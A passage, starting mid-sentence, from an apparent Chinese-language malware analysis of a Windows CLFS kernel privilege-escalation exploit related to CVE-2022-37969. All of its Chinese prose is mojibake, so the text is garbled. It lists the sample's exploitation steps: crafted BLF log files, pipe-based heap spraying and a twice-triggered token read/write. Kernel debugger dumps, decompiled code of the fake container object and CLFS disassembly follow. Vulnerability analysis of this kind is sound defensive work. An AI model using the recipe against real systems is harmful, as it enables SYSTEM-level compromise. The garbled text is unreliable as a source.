·æœ¬åˆ©ç”¨æ­¥éª¤\nåˆ›å»ºä¸€ä¸ªä¸»blfæ—¥å¿—æ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹ç‰¹å®šåç§»çš„å€¼ï¼Œè€Œåè°ƒç”¨AddLogContainerä¸ºå…¶æ·»åŠ å®¹å™¨ è°ƒç”¨CreateLogFIleåˆ›å»ºåä¸ªç”¨äºå †å¸ƒå±€çš„å‰¯BLFæ—¥å¿—æ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹ç‰¹å®šåç§»çš„å€¼ã€‚ åˆ†åˆ«ç”Ÿæˆ0x5000å’Œ0x4000å¯¹pipeï¼Œé¦–å…ˆå¯¹0x5000å¯¹pipeè°ƒç”¨WriteFileå†™å…¥ä¸»blfæ–‡ä»¶çš„base blockåœ°å€+0x30ï¼Œè€Œåä»0x1000å¯¹å¼€å§‹é‡Šæ”¾0x667å¯¹pipeï¼Œè€Œåè°ƒç”¨CreateLogFileï¼Œä¼ å…¥çš„æ–‡ä»¶åä¸ºç¬¬äºŒæ­¥æ‰€ç”¨çš„å‰¯blfæ–‡ä»¶åã€‚ ä¸º0x4000å¯¹pipeè°ƒç”¨WriteFileå†™å…¥å†…å­˜ï¼Œå’Œç¬¬ä¸‰æ­¥ä¸­å†™å…¥çš„ä¸€æ ·ã€‚ ä¸ºå‰é¢åä¸ªå‰¯blfæ–‡ä»¶æ·»åŠ å®¹å™¨ã€‚ å¯¹ä¸»blfæ—¥å¿—æ–‡ä»¶è°ƒç”¨CreateLogFileï¼Œè§¦å‘æ¼æ´ï¼Œä¸€å…±è§¦å‘ä¸¤æ¬¡ï¼Œåˆ†åˆ«å®Œæˆtokençš„è¯»å†™ã€‚ åŠ¨æ€è°ƒè¯•\nä½¿ç”¨x64dbgè°ƒè¯•æ ·æœ¬ï¼Œå¹¶ä½¿ç”¨windbgé™„åŠ å†…æ ¸è°ƒè¯•ã€‚åœ¨x64dbgä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ ·æœ¬è·å–åˆ°äº†system tokenå’Œè‡ªèº«tokenåœ°å€ã€‚\nåœ¨windbgä¸­å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸè·å–åˆ°äº†è‡ªèº«tokenåœ°å€å’Œsystem tokenåœ°å€\n1: kd\u0026gt; !process 16e0 1 Searching for Process with Cid == 16e0 PROCESS ffffcf8bfa9dd180 SessionId: 1 Cid: 16e0 Peb: 2b65a98000 ParentCid: 1cf4 FreezeCount 1 DirBase: a9197000 ObjectTable: ffffa80486c39280 HandleCount: 171. Image: 06248628e1ede80fcc3c36b25.exe VadRoot ffffcf8bfaac8ab0 Vads 86 Clone 0 Private 2360. Modified 5134. Locked 0. DeviceMap ffffa80480c82af0 Token ffffa80486595060 ElapsedTime 00:14:19.644 UserTime 00:00:00.000 KernelTime 00:00:00.000 QuotaPoolUsage[PagedPool] 195352 QuotaPoolUsage[NonPagedPool] 12024 Working Set Sizes (now,min,max) (5527, 50, 345) (22108KB, 200KB, 1380KB) PeakWorkingSetSize 5447 VirtualSize 4247 Mb PeakVirtualSize 4247 Mb PageFaultCount 12131 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 3956 DebugPort ffffcf8bf58da970 Job ffffcf8bf5fd5060 1: kd\u0026gt; dq FFFFCF8BFA9DD638 ffffcf8b`fa9dd638 ffffa804`86595064 00000000`00000000 1: kd\u0026gt; !process 4 1 Searching for Process with Cid == 4 PROCESS ffffcf8bf1695040 SessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000 DirBase: 001ad000 ObjectTable: ffffa8047c03ddc0 HandleCount: 2771. Image: System VadRoot ffffcf8bf1dd2da0 Vads 6 Clone 0 Private 22. Modified 335861. Locked 0. DeviceMap ffffa8047c0351e0 Token ffffa8047c04f6e0 ElapsedTime 2 Days 23:05:23.432 UserTime 00:00:00.000 KernelTime 00:07:35.203 QuotaPoolUsage[PagedPool] 0 QuotaPoolUsage[NonPagedPool] 272 Working Set Sizes (now,min,max) (24, 50, 450) (96KB, 200KB, 1800KB) PeakWorkingSetSize 218 VirtualSize 3 Mb PeakVirtualSize 14 Mb PageFaultCount 3280 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 49 1: kd\u0026gt; dq ffffcf8bf16954f8 ffffcf8b`f16954f8 ffffa804`7c04f6e3 00000000`00000000 ffffcf8b`f1695508 00000000`00000000 00000000`00000000 ffffcf8b`f1695518 00000000`00000000 00000000`00000000 ffffcf8b`f1695528 00000000`00000000 00000000`00000000 ffffcf8b`f1695538 00000000`00000016 00000000`00000000 ffffcf8b`f1695548 00000000`00000000 00000000`00000000 ffffcf8b`f1695558 00000000`00000000 00000000`00000000 ffffcf8b`f1695568 00000000`5333eb49 00000000`00000000 è€Œåè·å–åˆ°äº†å„ä¸ªå†…æ ¸å‡½æ•°åœ°å€\n1: kd\u0026gt; u FFFFF80634782B20 CLFS!ClfsEarlierLsn: fffff806`34782b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff806`34785338)] fffff806`34782b27 4885c9 test rcx,rcx fffff806`34782b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62) fffff806`34782b2c 488b09 mov rcx,qword ptr [rcx] fffff806`34782b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff806`34784ec0)] fffff806`34782b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62) fffff806`34782b38 483bc8 cmp rcx,rax fffff806`34782b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62) åœ¨è·å–åˆ°ä¸»blfæ—¥å¿—æ–‡ä»¶çš„base blockåé€šè¿‡writefileå†™å…¥åŒ¿åpipe\n1: kd\u0026gt; db FFFFA80488303000 ffffa804`88303000 15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... ffffa804`88303010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffa804`88303020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... ffffa804`88303030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa804`88303040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa804`88303050 00 00 00 00 00 00 00 00-69 03 00 00 00 00 00 00 ........i....... ffffa804`88303060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y...... ffffa804`88303070 05 00 00 00 00 00 00 00-80 11 28 07 7e 19 ee 11 ..........(.~... ç”±äºä¸çŸ¥é“æ ·æœ¬ä¿®æ”¹çš„æ–‡ä»¶ä¸­å“ªä¸ªéƒ¨åˆ†èµ·åˆ°äº†å…³é”®æ€§ä½œç”¨ï¼Œæ­¤æ—¶ç”±æœè¿½æº¯åŸå› ï¼Œæ ·æœ¬åœ¨ä¼ªé€ çš„CClfsContainerå¯¹è±¡ä¸­å¸ƒå±€äº†ClfsEarlierLsnå‡½æ•°åœ°å€ï¼Œåœ¨CVE-2022-37969ä¸­å·²ç»çŸ¥é“è¯¥å‡½æ•°æ˜¯è§¦å‘æ¼æ´çš„å…³é”®æ€§å‡½æ•°ï¼Œåœ¨ClfsEarlierLsnå‡½æ•°æ–­ç‚¹ï¼Œç»§ç»­è¿è¡Œï¼Œè°ƒè¯•å™¨æ–­ä¸‹ï¼Œæ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹\n0: kd\u0026gt; k # Child-SP RetAddr Call Site 00 ffffa00a`59414fb8 fffff800`53141ba6 CLFS!ClfsEarlierLsn 01 ffffa00a`59414fc0 fffff800`531337e8 CLFS!ClfsMgmtDeregisterManagedClient+0x46 02 ffffa00a`59414ff0 fffff800`5310307f CLFS!CClfsBaseFilePersisted::CheckSecureAccess+0x174 03 ffffa00a`594150b0 fffff800`53101bf9 CLFS!CClfsLogFcbPhysical::CheckSecureAccess+0x1f 04 ffffa00a`59415100 fffff800`531310c3 CLFS!CClfsLogFcbPhysical::Initialize+0x15d 05 ffffa00a`59415240 fffff800`53132b1b CLFS!CClfsRequest::Create+0x4ef 06 ffffa00a`59415390 fffff800`531328e7 CLFS!CClfsRequest::Dispatch+0x97 07 ffffa00a`594153e0 fffff800`53132837 CLFS!ClfsDispatchIoRequest+0x87 08 ffffa00a`59415430 fffff800`55c954d5 CLFS!CClfsDriver::LogIoDispatch+0x27 09 ffffa00a`59415460 fffff800`55c96ad4 nt!IofCallDriver+0x55 0a ffffa00a`594154a0 fffff800`560a775d nt!IoCallDriverWithTracing+0x34 0b ffffa00a`594154f0 fffff800`5608f68e nt!IopParseDevice+0x117d 0c ffffa00a`59415660 fffff800`560ba3da nt!ObpLookupObjectName+0x3fe 0d ffffa00a`59415830 fffff800`560c999f nt!ObOpenObjectByNameEx+0x1fa 0e ffffa00a`59415960 fffff800`560c9579 nt!IopCreateFile+0x40f 0f ffffa00a`59415a00 fffff800`55e0d8f5 nt!NtCreateFile+0x79 10 ffffa00a`59415a90 00007ffd`9160db64 nt!KiSystemServiceCopyEnd+0x25 11 00000077`5eafb898 00007ffd`8c382199 ntdll!NtCreateFile+0x14 12 00000077`5eafb8a0 00007ff7`ecad416a clfsw32!CreateLogFile+0x679 13 00000077`5eafba40 00007ff7`ecad461c 0624fbfa7618628e1ede80fcc3c36b25+0x416a 14 00000077`5eaffca0 00007ffd`900c7614 0624fbfa7618628e1ede80fcc3c36b25+0x461c 15 00000077`5eaffce0 00007ffd`915c26a1 KERNEL32!BaseThreadInitThunk+0x14 16 00000077`5eaffd10 00000000`00000000 ntdll!RtlUserThreadStart+0x21 æ ·æœ¬ä¸­å¯¹åº”çš„ä¼ªä»£ç å¦‚ä¸‹ï¼Œåœ¨è°ƒç”¨CreateLogFileæ—¶è§¦å‘äº†æ¼æ´ï¼Œè°ƒç”¨ClfsEarlierLsnå‡½æ•°ã€‚\nMEMORY[0x50011E0] = ClfsEarlierLsnKernelAddress; MEMORY[0x50011E8] = ClfsEarlierLsnKernelAddress; MEMORY[0x50011F0] = ClfsEarlierLsnKernelAddress; MEMORY[0x50011F8] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001000] = ClfsMgmtDeregisterManagedClientAddress; MEMORY[0x5001028] = RtlClearBitKernelAddress; MEMORY[0x5000008] = *(_QWORD *)(addr_array + 48) + *(unsigned int *)(addr_array + 56); CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); v65 = system_TOKEN; system_token_object = 0i64; v66 = *(void (__fastcall **)(__int64, size_t *, __int64, __int64, char *))(addr_array + 16); v67 = sub_7FF662E78B70(); v66(v67, \u0026amp;system_token_object, v65, 8i64, v88); if ( system_token_object \u0026gt;= 0x8181818181818181ui64 ) æ ¹æ®è°ƒç”¨æ ˆï¼Œå†é™¤å»å¸ƒå±€çš„å‡½æ•°ä¹‹å¤–ï¼Œæœ€åè°ƒç”¨çš„æ˜¯CLFS!CClfsBaseFilePersisted::CheckSecureAccess+0x174\nfffff800`531337d4 488bf9 mov rdi, rcx fffff800`531337d7 48894c2450 mov qword ptr [rsp+50h], rcx fffff800`531337dc 488b01 mov rax, qword ptr [rcx] fffff800`531337df 488b00 mov rax, qword ptr [rax] **fffff800`531337e2 ff15001effff call qword ptr [CLFS!__guard_dispatch_icall_fptr (fffff800531255e8)]** fffff800`531337e8 4c8d4c2448 lea r9, [rsp+48h] åŒæ—¶è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°rcxæŒ‡å‘çš„å¯¹è±¡ä½äº0x5000000ï¼ŒåŒæ—¶å¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘äº†ClfsEarlierLsnï¼Œå’Œè°ƒè¯•è¿‡ç¨‹ä¸­çš„ä¸€è‡´ã€‚\n0: kd\u0026gt; rrcx rcx=0000000005000000 0: kd\u0026gt; dq rcx 00000000`05000000 00000000`05001000 ffffa289`14aec2b2 00000000`05000010 00000000`00000000 00000000`00000000 00000000`05000020 00000000`00000000 00000000`00000000 00000000`05000030 ffffa289`17764520 00000000`00000000 00000000`05000040 00000000`00000000 00000000`00000000 00000000`05000050 00000000`00000000 00000000`00000000 00000000`05000060 00000000`00000000 00000000`00000000 00000000`05000070 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq 00000000`05001000 00000000`05001000 fffff800`53141b60 fffff800`53112b20 00000000`05001010 fffff800`53112b20 fffff800`53112b20 00000000`05001020 fffff800`53112b20 fffff800`55c2c640 00000000`05001030 fffff800`53112b20 fffff800`53112b20 00000000`05001040 fffff800`53112b20 fffff800`53112b20 00000000`05001050 fffff800`53112b20 fffff800`53112b20 00000000`05001060 fffff800`53112b20 fffff800`53112b20 00000000`05001070 fffff800`53112b20 fffff800`53112b20 0: kd\u0026gt; u fffff800`53112b20 CLFS!ClfsEarlierLsn: fffff800`53112b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`53115338)] fffff800`53112b27 4885c9 test rcx,rcx fffff800`53112b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) fffff800`53112b2c 488b09 mov rcx,qword ptr [rcx] fffff800`53112b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`53114ec0)] fffff800`53112b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) fffff800`53112b38 483bc8 cmp rcx,rax fffff800`53112b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) æ ¹æ®CClfsBaseFilePersisted::CheckSecureAccessçš„ä¼ªä»£ç ï¼Œå¯çŸ¥è§¦å‘æ¼æ´çš„é”™è¯¯å¯¹è±¡æ¥è‡ªäºCClfsBaseFile::GetSymbolï¼Œå¹¶ä¸”å…¶ç±»å‹ä¸º_CLFS_CONTAINER_CONTEXT å¯¹è±¡æŒ‡é’ˆã€‚\nSymbol = CClfsBaseFile::GetSymbol(a1, v14, v12, \u0026amp;v25);// è·å–åˆ°é”™è¯¯å¯¹è±¡ v17 = Symbol; if ( Symbol \u0026lt; 0 ) goto LABEL_21; v15 = (void (__fastcall ***)(_QWORD))*((_QWORD *)v25 + 3); if ( v15 ) { v20 = (struct CClfsContainer *)*((_QWORD *)v25 + 3);// è°ƒç”¨å‡½æ•°æŒ‡é’ˆ v7 = v20; __int64 __fastcall CClfsBaseFile::GetSymbol( PERESOURCE *this, unsigned int a2, int a3, struct _CLFS_CONTAINER_CONTEXT **a4) { ..... v6 = a2; v8 = 0; v17 = 0; if ( a2 \u0026lt; 0x1368 ) return 3222929421i64; *a4 = 0i64; ExAcquireResourceSharedLite(this[4], 1u); if ( !CClfsBaseFile::IsValidOffset((CClfsBaseFile *)this, v6 + 47) ) goto LABEL_15; CClfsBaseFile::GetBaseLogRecord((CClfsBaseFile *)this); v18[0] = 0; if ( (int)ULongAdd(v6, *(_DWORD *)(v11 + 40), (unsigned int *)v18) \u0026lt; 0 || !v12 || v18[0] \u0026gt;= (unsigned int)(*(unsigned __int16 *)(v13 + 4) \u0026lt;\u0026lt; 9) || !(v12 + v6) ) { goto LABEL_15; } if ( *(_DWORD *)(v12 + v6 - 12) != (_DWORD)v6 ) { v8 = -1073741816; LABEL_16: v17 = v8; goto LABEL_17; } v14 = ClfsQuadAlign(0x30u); if ( *(_DWORD *)(v15 - 16) != (unsigned __int64)(v16 + v14) || *(_DWORD *)v15 != -1040322552 || *(_DWORD *)(v15 + 4) != 48 || *(_DWORD *)(v15 + 16) != a3 ) { LABEL_15: v8 = -1072037875; goto LABEL_16; } *a4 = (struct _CLFS_CONTAINER_CONTEXT *)v15; ...... return v8; } PAGE:00000001C00346FE 8B FA mov edi, edx ...... PAGE:00000001C0034766 E8 B5 00 00 00 call ?GetBaseLogRecord@CClfsBaseFile@@IEAAPEAU_CLFS_BASE_RECORD_HEADER@@XZ ; CClfsBaseFile::GetBaseLogRecord(void) PAGE:00000001C0034766 PAGE:00000001C003476B ; 28: v18[0] = 0; PAGE:00000001C003476B 4C 8B C8 mov r9, rax PAGE:00000001C003476E 89 5C 24 24 mov [rsp+48h+var_24], ebx PAGE:00000001C0034772 ; 29: if ( (int)ULongAdd(v6, *(_DWORD *)(v11 + 40), (unsigned int *)v18) \u0026lt; 0 PAGE:00000001C0034772 ; 30: || !v12 PAGE:00000001C0034772 ; 31: || v18[0] \u0026gt;= (unsigned int)(*(unsigned __int16 *)(v13 + 4) \u0026lt;\u0026lt; 9) PAGE:00000001C0034772 ; 32: || !(v12 + v6) ) PAGE:00000001C0034772 4C 8D 44 24 24 lea r8, [rsp+48h+var_24] PAGE:00000001C0034777 41 8B 53 28 mov edx, [r11+28h] PAGE:00000001C003477B 8B CF mov ecx, edi PAGE:00000001C003477D E8 1E 7D FD FF call ?ULongAdd@@YAJKKPEAK@Z ; ULongAdd(ulong,ulong,ulong *) PAGE:00000001C003477D PAGE:00000001C0034782 85 C0 test eax, eax PAGE:00000001C0034784 78 5B js short loc_1C00347E1 PAGE:00000001C0034784 PAGE:00000001C0034786 4D 85 C9 test r9, r9 PAGE:00000001C0034789 74 56 jz short loc_1C00347E1 PAGE:00000001C0034789 PAGE:00000001C003478B 41 0F B7 43 04 movzx eax, word ptr [r11+4] PAGE:00000001C0034790 C1 E0 09 shl eax, 9 PAGE:00000001C0034793 39 44 24 24 cmp [rsp+48h+var_24], eax PAGE:00000001C0034797 73 48 jnb short loc_1C00347E1 PAGE:00000001C0034797 PAGE:00000001C0034799 ; 34: goto LABEL_15; PAGE:00000001C0034799 48 8B D7 mov rdx, rdi PAGE:00000001C003479C 49 03 D1 add rdx, r9 ...... PAGE:00000001C00347DC 49 89 16 mov [r14], rdx æ ¹æ®ä¼ªä»£ç å’Œæ±‡ç¼–å¯çŸ¥æœ€ç»ˆa4çš„å€¼ç”±rdx+r9ï¼Œr9æ¥è‡ªäºGetBaseLogRecordå‡½æ•°è¿”å›å€¼ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šå€¼ï¼Œrdxæ˜¯CClfsBaseFile::GetSymbolçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†å€¼èµ‹ç»™a4éœ€è¦æ»¡è¶³ifè¯­å¥ä¸­çš„æ¡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å¯¹åº”äºåœ¨ä¸»blfæ–‡ä»¶ä¿®æ”¹çš„å‡ ä¸ªå€¼ã€‚\nåœ¨CClfsBaseFilePersisted::CheckSecureAccessä¸­ï¼ŒGetSymbolçš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºBaseLogRecord+0x328ï¼Œå¯¹åº”äºrgContainersæ•°ç»„ã€‚\nBaseLogRecord = CClfsBaseFile::GetBaseLogRecord((CClfsBaseFile *)a1); v26 = BaseLogRecord; if ( !BaseLogRecord ) { LABEL_20: Symbol = -1072037875; v17 = -1072037875; goto LABEL_21; } v12 = 0i64; v24 = 0; v13 = 0; v23 = 0; while ( v13 \u0026lt; v11 \u0026amp;\u0026amp; (unsigned int)v12 \u0026lt; 0x400 ) { v14 = *((_DWORD *)BaseLogRecord + v12 + 0xCA); if ( v14 ) { Symbol = CClfsBaseFile::GetSymbol(a1, v14, v12, \u0026amp;v25);// è·å–åˆ°é”™è¯¯å¯¹è±¡ åœ¨å†…å­˜ä¸­å¯ä»¥çœ‹åˆ°å…¶å€¼ä¸º0x1570\n0: kd\u0026gt; db ffffe381`a86d7070 + 0x328 ffffe381`a86d7398 70 15 00 00 00 00 00 00-00 00 00 00 00 00 00 00 p............... ffffe381`a86d73a8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ æ ¹æ®ä»£ç é€»è¾‘GetSymbolä¼šæ ¹æ®BaseLogRecord+0x1570å®šä½container contextå¯¹è±¡å¹¶å°è¯•è°ƒç”¨pContaineræˆå‘˜çš„æŒ‡é’ˆï¼Œcontainer contextå¦‚ä¸‹ï¼š\n0: kd\u0026gt; dq ffffe381`a86d7070 + 0x1570 ffffe381`a86d85e0 00000030`c1fdf008 00000000`00000000 ffffe381`a86d85f0 00000000`00000000 00000000`05000000 0: kd\u0026gt; dps 00000000`05000000 00000000`05000000 00000000`05001000 00000000`05000008 ffffa289`14aec2b2 00000000`05000010 00000000`00000000 00000000`05000018 00000000`00000000 00000000`05000020 00000000`00000000 00000000`05000028 00000000`00000000 00000000`05000030 ffffa289`17764520 00000000`05000038 00000000`00000000 00000000`05000040 00000000`00000000 00000000`05000048 00000000`00000000 00000000`05000050 00000000`00000000 00000000`05000058 00000000`00000000 00000000`05000060 00000000`00000000 00000000`05000068 00000000`00000000 00000000`05000070 00000000`00000000 00000000`05000078 00000000`00000000 0: kd\u0026gt; dq 00000000`05001000 00000000`05001000 fffff800`53141b60 fffff800`53112b20 00000000`05001010 fffff800`53112b20 fffff800`53112b20 00000000`05001020 fffff800`53112b20 fffff800`55c2c640 00000000`05001030 fffff800`53112b20 fffff800`53112b20 00000000`05001040 fffff800`53112b20 fffff800`53112b20 00000000`05001050 fffff800`53112b20 fffff800`53112b20 00000000`05001060 fffff800`53112b20 fffff800`53112b20 00000000`05001070 fffff800`53112b20 fffff800`53112b20 0: kd\u0026gt; u fffff800`53141b60 CLFS!ClfsMgmtDeregisterManagedClient: fffff800`53141b60 48895c2408 mov qword ptr [rsp+8],rbx fffff800`53141b65 57 push rdi fffff800`53141b66 4883ec20 sub rsp,20h fffff800`53141b6a 488bd9 mov rbx,rcx fffff800`53141b6d 4885c9 test rcx,rcx fffff800`53141b70 0f841ae50000 je CLFS!ClfsMgmtDeregisterManagedClient+0xe530 (fffff800`53150090) fffff800`53141b76 4c8b150335feff mov r10,qword ptr [CLFS!_imp_KeEnterCriticalRegion (fffff800`53125080)] fffff800`53141b7d e8ae5eb302 call nt!KeEnterCriticalRegion (fffff800`55c77a30) 0: kd\u0026gt; u fffff800`53112b20 CLFS!ClfsEarlierLsn: fffff800`53112b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`53115338)] fffff800`53112b27 4885c9 test rcx,rcx fffff800`53112b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) fffff800`53112b2c 488b09 mov rcx,qword ptr [rcx] fffff800`53112b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`53114ec0)] fffff800`53112b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) fffff800`53112b38 483bc8 cmp rcx,rax fffff800`53112b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62) è°ƒç”¨pContainerçš„å‡½æ•°æŒ‡é’ˆæ±‡ç¼–å¦‚ä¸‹\nPAGE:00000001C00337AF E8 2C 0F 00 00 call ?GetSymbol@CClfsBaseFile@@QEAAJJKPEAPEAU_CLFS_CONTAINER_CONTEXT@@@Z ; CClfsBaseFile::GetSymbol(long,ulong,_CLFS_CONTAINER_CONTEXT * *) PAGE:00000001C00337AF PAGE:00000001C00337B4 8B D8 mov ebx, eax PAGE:00000001C00337B6 ; 66: v17 = Symbol; PAGE:00000001C00337B6 89 44 24 40 mov [rsp+0B8h+var_78], eax PAGE:00000001C00337BA ; 67: if ( Symbol \u0026lt; 0 ) PAGE:00000001C00337BA 85 C0 test eax, eax PAGE:00000001C00337BC ; 68: goto LABEL_21; PAGE:00000001C00337BC 0F 88 F1 00 00 00 js loc_1C00338B3 PAGE:00000001C00337BC PAGE:00000001C00337C2 ; 69: v15 = (void (__fastcall ***)(_QWORD))*((_QWORD *)v25 + 3); PAGE:00000001C00337C2 48 8B 44 24 70 mov rax, [rsp+0B8h+var_48] PAGE:00000001C00337C7 48 8B 48 18 mov rcx, [rax+18h] PAGE:00000001C00337CB ; 70: if ( v15 ) PAGE:00000001C00337CB 48 85 C9 test rcx, rcx PAGE:00000001C00337CE 0F 84 EB 00 00 00 jz loc_1C00338BF PAGE:00000001C00337CE PAGE:00000001C00337D4 ; 73: v7 = v20; PAGE:00000001C00337D4 48 8B F9 mov rdi, rcx PAGE:00000001C00337D7 ; 72: v20 = (struct CClfsContainer *)*((_QWORD *)v25 + 3);// è°ƒç”¨å‡½æ•°æŒ‡é’ˆ PAGE:00000001C00337D7 48 89 4C 24 50 mov [rsp+0B8h+var_68], rcx PAGE:00000001C00337DC ; 74: (**v15)(v15); PAGE:00000001C00337DC 48 8B 01 mov rax, [rcx] PAGE:00000001C00337DF 48 8B 00 mov rax, [rax] PAGE:00000001C00337E2 FF 15 00 1E FF FF call cs:__guard_dispatch_icall_fptr pContaineræŒ‡å‘çš„å¯¹è±¡çš„ç¬¬ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘äº†ClfsMgmtDeregisterManagedClientï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨rcx+0x28å’Œrcx+0x8çš„å‡½æ•°æŒ‡é’ˆã€‚\nNTSTATUS __stdcall ClfsMgmtDeregisterManagedClient(CLFS_MGMT_CLIENT ClientCookie) { NTSTATUS v2; // edi if ( !ClientCookie ) return -1073741811; KeEnterCriticalRegion(); v2 = (*(__int64 (__fastcall **)(CLFS_MGMT_CLIENT, _QWORD))(*(_QWORD *)ClientCookie + 0x28i64))(ClientCookie, 0i64); (*(void (__fastcall **)(CLFS_MGMT_CLIENT))(*(_QWORD *)ClientCookie + 8i64))(ClientCookie); KeLeaveCriticalRegion(); return v2; } è€ŒrcxæŒ‡å‘äº†0x501000ï¼Œåœ¨å†…å­˜å¸ƒå±€ä¸­rcx+0x28å’Œrcx+0x8åˆ†åˆ«æŒ‡å‘äº†RtlClearBitå’ŒClfsEarlierLsnå‡½æ•°ã€‚\nå›æº¯è§¦å‘è¿‡ç¨‹ï¼Œå®¹æ˜“å¾—å‡ºç»“è®ºï¼Œæ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒæ˜¯rgContainersæ•°ç»„è¢«ä¿®æ”¹å¯¼è‡´å®šä½åˆ°äº†é”™è¯¯çš„container contextï¼Œåœ¨æ­£å¸¸æ–‡ä»¶ä¸­rgContainerså¤„åç§»ä¸º0x1470ï¼Œåœ¨è§¦å‘æ¼æ´æ—¶ï¼Œè¯¥å€¼è¢«ä¿®æ”¹ä¸ºäº†0x1570ã€‚é”™è¯¯çš„container contextç”±æ”»å‡»è€…æ§åˆ¶ï¼Œä»è€Œæ§åˆ¶åˆ°äº†CClfsContainerå¯¹è±¡ï¼Œå¯¼è‡´è°ƒç”¨äº†é”™è¯¯çš„å‡½æ•°æŒ‡é’ˆã€‚\nå†æ¬¡è°ƒè¯•ï¼Œåœ¨ä¸»blfæ–‡ä»¶çš„baselogrecord+0x328ä½ç½®å¤„ä¸‹å†™æ–­ç‚¹ã€‚è¿è¡Œæ ·æœ¬ã€‚åœ¨CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9aå¤„æ–­ä¸‹ã€‚\n1: kd\u0026gt; ba w2 FFFFE381A2303000+0x398 0: kd\u0026gt; k # Child-SP RetAddr Call Site 00 ffffa00a`57e30340 fffff800`531519cf CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a 01 ffffa00a`57e303d0 fffff800`5312b839 CLFS!CClfsBaseFilePersisted::ExtendMetadataBlock+0x423 02 ffffa00a`57e304a0 fffff800`5312ccbc CLFS!CClfsBaseFilePersisted::AddSymbol+0x10d 03 ffffa00a`57e30520 fffff800`5312b3e6 CLFS!CClfsBaseFilePersisted::AddContainer+0xdc 04 ffffa00a`57e305d0 fffff800`53154845 CLFS!CClfsLogFcbPhysical::AllocContainer+0x136 05 ffffa00a`57e30670 fffff800`53132dd5 CLFS!CClfsRequest::AllocContainer+0x27d 06 ffffa00a`57e30730 fffff800`531328e7 CLFS!CClfsRequest::Dispatch+0x351 07 ffffa00a`57e30780 fffff800`53132837 CLFS!ClfsDispatchIoRequest+0x87 08 ffffa00a`57e307d0 fffff800`55c954d5 CLFS!CClfsDriver::LogIoDispatch+0x27 09 ffffa00a`57e30800 fffff800`560a6048 nt!IofCallDriver+0x55 0a ffffa00a`57e30840 fffff800`560a5e47 nt!IopSynchronousServiceTail+0x1a8 0b ffffa00a`57e308e0 fffff800`560a51c6 nt!IopXxxControlFile+0xc67 0c ffffa00a`57e30a20 fffff800`55e0d8f5 nt!NtDeviceIoControlFile+0x56 0d ffffa00a`57e30a90 00007ffd`9160d1a4 nt!KiSystemServiceCopyEnd+0x25 0e 0000009e`74b1b448 00007ffd`8f0c572b ntdll!NtDeviceIoControlFile+0x14 0f 0000009e`74b1b450 00007ffd`900c5bf1 KERNELBASE!DeviceIoControl+0x6b 10 0000009e`74b1b4c0 00007ffd`7e4a2895 KERNEL32!DeviceIoControlImplementation+0x81 11 0000009e`74b1b510 00007ffd`7e4a245c clfsw32!AddLogContainerSet+0x425 12 0000009e`74b1b5f0 00007ff7`ecad3e82 clfsw32!AddLogContainer+0x3c 13 0000009e`74b1b630 00007ff7`ecad461c 0624fbfa7618628e1ede80fcc3c36b25+0x3e82 14 0000009e`74b1f890 00007ffd`900c7614 0624fbfa7618628e1ede80fcc3c36b25+0x461c 15 0000009e`74b1f8d0 00007ffd`915c26a1 KERNEL32!BaseThreadInitThunk+0x14 16 0000009e`74b1f900 00000000`00000000 ntdll!RtlUserThreadStart+0x21 å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ä¸º\nfffff800`53134276 4aff0430 inc qword ptr [rax+r14] åœ¨æ ·æœ¬ä¸­ä¸ºå¾ªç¯ç»™åˆ›å»ºçš„10ä¸ªå‰¯blfæ–‡ä»¶æ·»åŠ 